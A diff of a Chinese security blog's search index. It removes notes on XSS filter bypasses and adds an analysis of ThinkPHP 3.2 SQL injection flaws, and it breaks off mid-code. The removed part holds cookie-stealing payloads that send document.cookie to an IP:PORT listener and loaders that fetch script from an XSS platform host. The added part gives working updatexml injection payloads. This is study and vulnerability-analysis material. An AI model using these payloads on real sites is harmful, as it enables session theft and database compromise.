@@ -422,36 +422,133 @@
 ]]></content>
   </entry>
   <entry>
-    <title>XSS一些记录</title>
-    <url>/2021/05/17/XSS%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h3 id="XSS一些总结"><a href="#XSS一些总结" class="headerlink" title="XSS一些总结"></a>XSS一些总结</h3><p>除了script以外大多标签自动加载触发JS代码大多用的都是on事件，以下标签都可以用下面的方法去打Cookie以及url等</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">常见标签</span><br><span class="line">&lt;img&gt;&lt;input&gt;&lt;details&gt;&lt;svg&gt;&lt;select&gt;&lt;iframe&gt;</span><br><span class="line">&lt;video&gt;&lt;audio&gt;&lt;textarea&gt;  &lt;body&gt;&lt;Style&gt;&lt;Media&gt;</span><br><span class="line">such <span class="keyword">as</span>: 其他的标签自动触发百度一下就好了</span><br><span class="line">&lt;body onpageshow=alert(<span class="number">1</span>)&gt;</span><br><span class="line"></span><br><span class="line">Media 标签是利用音视频标签来加载XSS Payload</span><br><span class="line">测试了一下自动触发事件的标签</span><br><span class="line">onloadstart: 在浏览器开始寻找指定音视频（audio/video）时触发；</span><br><span class="line"></span><br><span class="line">&lt;audio onloadstart=alert(<span class="number">1</span>) src=<span class="string">&quot;x.mp3&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">反射内容</span><br><span class="line">-alert(<span class="number">1</span>)-  -prompt(<span class="number">1</span>)- -confirm(<span class="number">1</span>)-</span><br><span class="line"></span><br><span class="line">javascript伪协议</span><br><span class="line">&lt;iframe src=javascript:alert(<span class="string">&#x27;xss&#x27;</span>);&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">利用link远程包含js文件</span><br><span class="line">PS：在无CSP的情况下才可以</span><br><span class="line">&lt;link rel=<span class="keyword">import</span> href=<span class="string">&quot;http://127.0.0.1/1.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+    <title>ThinkPHP3.2注入漏洞学习</title>
+    <url>/2021/07/29/ThinkPHP3-2%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<center>ThinkPHP3.2注入漏洞学习</center>
 
-<h3 id="常见的绕过技巧"><a href="#常见的绕过技巧" class="headerlink" title="常见的绕过技巧"></a>常见的绕过技巧</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、用&#x2F;代替空格</span><br><span class="line">&lt;img&#x2F;src&#x3D;&quot;x&quot;&#x2F;onerror&#x3D;alert(&quot;xss&quot;);&gt;</span><br><span class="line">2、大小写绕过</span><br><span class="line">3、双写关键字</span><br><span class="line">4、字符拼接</span><br><span class="line">利用eval:</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;a&#x3D;&#96;aler&#96;;b&#x3D;&#96;t&#96;;c&#x3D;&#39;(&#96;xss&#96;);&#39;;eval(a+b+c)&quot;&gt;</span><br><span class="line">利用top:</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;top[&quot;al&quot;+&quot;ert&quot;](&#96;xss&#96;);&gt;</span><br><span class="line">    </span><br><span class="line">5、编码绕过</span><br><span class="line">------------------</span><br><span class="line">Base64编码</span><br><span class="line">------------------</span><br><span class="line">&#39;&quot;&gt;&lt;img src&#x3D;x id&#x3D;dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzOC5jYy9uR1JTIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#x3D;&#x3D; onerror&#x3D;eval(atob(this.id))&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNDUmlQdC9TckM9Ly94c3M4LmNjL25HUlM+&quot;&gt;</span><br><span class="line">------------------</span><br><span class="line">ASCII编码</span><br><span class="line">------------------</span><br><span class="line">&lt;img src&#x3D;&quot;&quot; onerror&#x3D;&quot;document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,56,46,99,99,47,110,71,82,83,62,60,47,115,67,114,73,112,84,62))&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br><span class="line">-------------------</span><br><span class="line">空字节【未成功过，自测】</span><br><span class="line">-------------------</span><br><span class="line">最长用来绕过mod_security防火墙，形式如下：</span><br><span class="line">&lt;scri%00pt&gt;alert(1);&lt;&#x2F;scri%00pt&gt;</span><br><span class="line">&lt;scri\x00pt&gt;alert(1);&lt;&#x2F;scri%00pt&gt;</span><br><span class="line">&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;&#x2F;s%00c%00r%00%00ip%00t&gt;</span><br><span class="line">空字节只适用于PHP 5.3.8以上的版本</span><br><span class="line">-------------------</span><br><span class="line">Unicode编码绕过</span><br><span class="line">-------------------</span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;</span><br><span class="line">-------------------</span><br></pre></td></tr></table></figure>
+<h1 id="Exp注入"><a href="#Exp注入" class="headerlink" title="Exp注入"></a>Exp注入</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>我们可以看到漏洞代码并没有使用<code>I函数</code>（<strong>使用<code>I函数</code>则不会产生exp注入</strong>）原因后面会分析</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//        $username=I(username);</span></span><br><span class="line">        <span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];  <span class="comment">//注意这里是GET接受的参数</span></span><br><span class="line">        <span class="variable">$data</span>=M(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span>])-&gt;select();</span><br><span class="line"></span><br><span class="line">        dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="常见字符过滤"><a href="#常见字符过滤" class="headerlink" title="常见字符过滤"></a>常见字符过滤</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">*过滤&lt;script&gt;利用拼接然后继续使用XSS平台【双写，编码自己自己尝试】</span><br><span class="line">&lt;img src=x onerror=s=createElement(<span class="string">&#x27;scr&#x27;</span>+<span class="string">&#x27;ipt&#x27;</span>);body.appendChild(s);s.src=<span class="string">&#x27;//xss8.cc/nGRS&#x27;</span>;&gt;</span><br><span class="line"></span><br><span class="line">*过滤单双引号</span><br><span class="line">如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=alert(<span class="string">`xss`</span>);&gt;</span><br><span class="line">    </span><br><span class="line">*过滤括号</span><br><span class="line">当括号被过滤的时候可以使用<span class="keyword">throw</span>来绕过</span><br><span class="line">&lt;svg/onload=<span class="string">&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;</span>&gt;</span><br><span class="line">    </span><br><span class="line">*过滤url地址</span><br><span class="line">使用URL编码、十进制IP、八进制IP、hex、html标签中用<span class="comment">//可以代替http://、使用\\</span></span><br><span class="line">使用中文逗号代替英文逗号</span><br><span class="line"></span><br><span class="line">其他的Payload</span><br><span class="line">&lt;svg/onload=location=<span class="string">`javas`</span>+<span class="string">`cript:ale`</span>+<span class="string">`rt%2`</span>+<span class="string">`81%2`</span>+<span class="string">`9`</span>;</span><br><span class="line"></span><br><span class="line">Eval &amp; 其它冗余符号</span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="built_in">eval</span>()&gt;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;~a~le~rt~~(~~1~~)~&#x27;</span>.replace(<span class="regexp">/~/g</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="built_in">eval</span>(\<span class="string">&#x27;~a~le~rt~~(~~1~~)~\&#x27;.replace(/~/g, \&#x27;\&#x27;))</span></span><br><span class="line"><span class="string">eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g, new String()))</span></span><br><span class="line"><span class="string">var x = eval; x(‘alert(1)’)</span></span><br><span class="line"><span class="string">(1, eval)(&#x27;</span>alert(<span class="number">1</span>)<span class="string">&#x27;) </span></span><br><span class="line"><span class="string">eval.call(null, &#x27;</span>alert(<span class="number">1</span>)<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username[0]&#x3D;exp&amp;username[1]&#x3D;&#x3D;&#39;admin&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure>
 
-<h3 id="SVG黑魔法-IMG标签-等其他同理"><a href="#SVG黑魔法-IMG标签-等其他同理" class="headerlink" title="SVG黑魔法 IMG标签 等其他同理"></a>SVG黑魔法 IMG标签 等其他同理</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">1234</span></span><br><span class="line">&lt;svg/onload=<span class="string">&quot;document.location=&#x27;http://IP:PORT/?&#x27;+document.URL+&#x27;:&#x27;+document.cookie&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;document.location=&#x27;http://IP:PORT/?&#x27;+document.URL+&#x27;:&#x27;+document.cookie&quot;</span>&gt;</span><br><span class="line">获取当前域名URL：</span><br><span class="line"><span class="built_in">window</span>.location.href</span><br><span class="line"><span class="built_in">document</span>.location</span><br><span class="line"><span class="built_in">document</span>.URL</span><br></pre></td></tr></table></figure>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsxo4uwmygj31cr0hm4ak.jpg" alt="image-20210728135419160"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们先来了解一下where中的exp</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsxo53cothj30zx0lq47e.jpg" alt="image-20210728135932523"></p>
+<p>例如下面两条语句是完全相等的。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$map</span>[<span class="string">&#x27;username&#x27;</span>]  = <span class="keyword">array</span>(<span class="string">&#x27;in&#x27;</span>,<span class="string">&#x27;admin,r0ser1&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gqs7ls5nf0j30if087jug.jpg" alt="image-20210519080602555"></p>
-<h3 id="图片探测路径"><a href="#图片探测路径" class="headerlink" title="图片探测路径"></a>图片探测路径</h3><blockquote>
-<p>只要对方网站可以调用外部图片(或可自定义HTML)。你就可以拿到对方当前的后台、浏览器、IP地址之类的信息【有些网站做了meta referer设置，referer就抓不到了】<br>搜索图片XSS即可,XSS平台是有这种的。原理就是图片嵌入了前端的一些代码。</p>
-<p>例如：&lt;img src=”<a href="http://ip/test.php&quot;/&gt;">http://IP/test.php&quot;/&gt;</a><br>然后再PHP里面写入获取HTTP_REFERER’<code>,</code>‘REMOTE_ADDR’<code>,</code>‘HTTP_USER_AGENT<br>即可达到目的</p>
-</blockquote>
-<h3 id="console设置Cookie"><a href="#console设置Cookie" class="headerlink" title="console设置Cookie"></a>console设置Cookie</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cookiestr=<span class="string">&quot;你的打到的cookie内容&quot;</span>;<span class="keyword">var</span> arr = cookiestr.split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> arr)&#123;<span class="built_in">document</span>.cookie=arr[i];&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$map</span>[<span class="string">&#x27;username&#x27;</span>]  = <span class="keyword">array</span>(<span class="string">&#x27;exp&#x27;</span>,<span class="string">&#x27; IN (admin,r0ser1) &#x27;</span>);</span><br></pre></td></tr></table></figure>
 
-<h3 id="前端钓鱼"><a href="#前端钓鱼" class="headerlink" title="前端钓鱼"></a>前端钓鱼</h3><p><a href="https://www.cnblogs.com/-qing-/p/10871625.html">https://www.cnblogs.com/-qing-/p/10871625.html</a></p>
-<h3 id="apache-httponly-bypass"><a href="#apache-httponly-bypass" class="headerlink" title="apache httponly bypass"></a>apache httponly bypass</h3><blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用apache server head limit 8192字节限制, 从400状态页爆出httponly保护的cookie</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3 id="预防XSS"><a href="#预防XSS" class="headerlink" title="预防XSS"></a>预防XSS</h3><p>CSP策略：<a href="https://www.zhihu.com/question/21979782">https://www.zhihu.com/question/21979782</a><br>PHP的函数：htmlspecialchars、htmlentities</p>
-<blockquote>
-<p>​    htmlspecialchars默认配置是不过滤单引号的。只有设置了：quotestyle 选项为ENT_QUOTES才会过滤单引号，所以咋只要’onmouseover=’alert(document.domain)这样既可绕过，根据实际情况来吧。</p>
-</blockquote>
-<p>参考：<a href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a><br><a href="https://www.cnblogs.com/-qing-/p/10872564.html">https://www.cnblogs.com/-qing-/p/10872564.html</a></p>
+<p>所以我们这时候传入数组即可，使用exp模式传入POC来直接跟进代码。</p>
+<p>我们F7直接跟进where</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span>=M(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span>])-&gt;select();</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的位置</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$resultSet</span>  = <span class="keyword">$this</span>-&gt;db-&gt;select(<span class="variable">$options</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="keyword">$this</span>-&gt;parseSql(<span class="keyword">$this</span>-&gt;selectSql,<span class="variable">$options</span>);</span><br></pre></td></tr></table></figure>
+
+<p>跟进到<code>Libray\Think\Driver.class.php</code>文件中的976行，<code>ParseSql</code>进行替换表达式</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsxo58n26oj319t0fbk6h.jpg" alt="image-20210728140841571"></p>
+<p>我们跟进到<code>parseWhereItem</code>函数  // 重点</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsxo5dli2wj31c50kowu7.jpg" alt="image-20210728141624920"></p>
+<p>可以看到当<code>$exp==exp</code>时直接进行拼接，没有任何的过滤。所以导致了我们的SQL注入。</p>
+<p>现在我们来分析一下 <code>I函数</code> 在<code>I函数</code>内部的<code>think_filter</code>中，对exp进行了正则匹配，如果匹配到了会在其后面加空格，所以我们也就无法让<code>$exp==exp</code>了进而无法拼接SQL语句</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gsxo5iiow1j315t068tc0.jpg" alt="image-20210728142713456"></p>
+<h1 id="bind注入"><a href="#bind注入" class="headerlink" title="bind注入"></a>bind注入</h1><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用代码如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$con</span>[<span class="string">&#x27;username&#x27;</span>]=I(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;passwd&#x27;</span>]=I(<span class="string">&#x27;passwd&#x27;</span>);</span><br><span class="line">        <span class="variable">$res</span>=M(<span class="string">&#x27;users&#x27;</span>)-&gt;where(<span class="variable">$con</span>)-&gt;save(<span class="variable">$data</span>);</span><br><span class="line">        dump(<span class="variable">$res</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[0]&#x3D;bind&amp;username[1]&#x3D;0 and 1&#x3D;(updatexml(1,concat(0x3a,(user())),1))&amp;passwd&#x3D;admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsxo5nu5gij31ey0h6qeu.jpg" alt="image-20210728163342719"></p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接到进入<code>ThinkPHP/Library/Think/Model.class.php</code>：451跟进去</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span>  = <span class="keyword">$this</span>-&gt;db-&gt;update(<span class="variable">$data</span>,<span class="variable">$options</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后来到<code>ThinkPHP/Library/Think/Driver.class.php</code>:893</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>]:<span class="keyword">array</span>());</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseBind</span>(<span class="params"><span class="variable">$bind</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bind  =  array_merge(<span class="keyword">$this</span>-&gt;bind,<span class="variable">$bind</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>使的<code>bind</code>为空数组 继续跟进<code>$this-&gt;parseSet($data);</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>   = <span class="string">&#x27;UPDATE &#x27;</span> . <span class="variable">$table</span> . <span class="keyword">$this</span>-&gt;parseSet(<span class="variable">$data</span>);   <span class="comment">//895行</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsxo5tsjyaj30yt0cyqbk.jpg" alt="image-20210728165647886"></p>
+<p>进入<code>bindParam</code>中，将我们的this-&gt;bind设置为<code>:0=admin</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">protectedfunction bindParam(<span class="variable">$name</span>,<span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;bind[<span class="string">&#x27;:&#x27;</span>.<span class="variable">$name</span>]  =   <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>来到<code>parseWhere</code>函数进行一些赋值等操作 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> .= <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>跟进行后漏洞重点在于<code>ThinkPHP/Library/Think/Db/Driver.class.php:547</code>中</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsxo5yucepj31d90hhnaj.jpg" alt="image-20210728164542988"></p>
+<p>于是我们的SQL语句变成了</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE `users` <span class="keyword">SET</span> `passwd`<span class="operator">=</span>:<span class="number">0</span> <span class="keyword">WHERE</span> `username` <span class="operator">=</span> :<span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">user</span>())),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<p>然后回到<code>Driver.class.php</code>进入906</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute(<span class="variable">$sql</span>,!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后对<code>:0</code>进行了替换</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$fetchSql</span>=<span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;initConnect(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="keyword">$this</span>-&gt;_linkID ) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;queryStr = <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;bind))&#123;</span><br><span class="line">        <span class="variable">$that</span>   =   <span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;queryStr =   strtr(<span class="keyword">$this</span>-&gt;queryStr,array_map(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$val</span></span>) <span class="title">use</span>(<span class="params"><span class="variable">$that</span></span>)</span>&#123; <span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$that</span>-&gt;escapeString(<span class="variable">$val</span>).<span class="string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="keyword">$this</span>-&gt;bind));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是我们的SQL语句也就变成了</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE `users` <span class="keyword">SET</span> `passwd`<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">WHERE</span> `username` <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">user</span>())),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<p>这就是为什么我们需要将payload中username[1]设置为0的原因</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[0]&#x3D;bind&amp;username[1]&#x3D;0</span><br></pre></td></tr></table></figure>
+
+<h1 id="find-select-delete-注入"><a href="#find-select-delete-注入" class="headerlink" title="find(),select(),delete()注入"></a>find(),select(),delete()注入</h1><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里只举例Find其他同理</p>
+<p>测试代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$res</span>=M(<span class="string">&#x27;users&#x27;</span>)-&gt;find(I(<span class="string">&#x27;id&#x27;</span>));</span><br><span class="line">        dump(<span class="variable">$res</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id[where]&#x3D;1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsxo654rfnj61ef0j2wye02.jpg" alt="image-20210729100459301"></p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接下断点然后开始进入<code>I方法</code>对接收的参数进行分割判断然后进行一次 <code>htmlspecialchars </code>和 <code>think_filter</code> 的过滤处理</p>
+<p>随后从<code>I方法</code>中出来之后就进入到了<code> find</code> 方法中然后跟进<code>_parseOptions</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array(<span class="variable">$options</span>))</span><br><span class="line">        <span class="variable">$options</span> = array_merge(<span class="keyword">$this</span>-&gt;options,<span class="variable">$options</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">// 自动获取表名</span></span><br><span class="line">        <span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]   =   <span class="keyword">$this</span>-&gt;getTableName();</span><br><span class="line">        <span class="variable">$fields</span> = <span class="keyword">$this</span>-&gt;fields;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 指定数据表 则重新获取字段列表 但不支持类型检测</span></span><br><span class="line">        <span class="variable">$fields</span> = <span class="keyword">$this</span>-&gt;getDbFields();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 数据表别名</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;alias&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]  .=   <span class="string">&#x27; &#x27;</span>.<span class="variable">$options</span>[<span class="string">&#x27;alias&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 记录操作的模型名称</span></span><br><span class="line">    <span class="variable">$options</span>[<span class="string">&#x27;model&#x27;</span>]  = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    <span class="comment">// 字段类型验证</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; is_array(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// 对数组查询条件进行字段类型检查</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$key</span>            =   trim(<span class="variable">$key</span>);</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$key</span>,<span class="variable">$fields</span>,<span class="literal">true</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(is_scalar(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;_parseType(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>],<span class="variable">$key</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(!is_numeric(<span class="variable">$key</span>) &amp;&amp; <span class="string">&#x27;_&#x27;</span> != substr(<span class="variable">$key</span>,<span class="number">0</span>,<span class="number">1</span>) &amp;&amp; <span class="literal">false</span> === strpos(<span class="variable">$key</span>,<span class="string">&#x27;.&#x27;</span>) &amp;&amp; <span class="literal">false</span> === strpos(<span class="variable">$key</span>,<span class="string">&#x27;(&#x27;</span>) 